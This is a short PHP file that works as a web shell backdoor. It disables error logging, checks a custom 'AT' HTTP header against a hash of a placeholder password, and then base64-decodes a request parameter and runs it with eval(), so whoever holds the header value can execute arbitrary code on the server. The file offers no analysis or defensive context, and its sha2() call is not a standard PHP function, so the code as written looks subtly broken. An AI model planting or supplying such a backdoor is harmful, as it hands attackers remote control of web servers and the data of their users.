<?php

error_reporting(E_ALL);
ini_set('log_errors', 0);
ini_set('display_errors', 1);
define('at', sha2('REPLACEME'));

if ($_SERVER['HTTP_AT'] == at) {
  $d=$_REQUEST['d'];
  $dd=base64_decode($_REQUEST['d']);
  eval($dd);
}
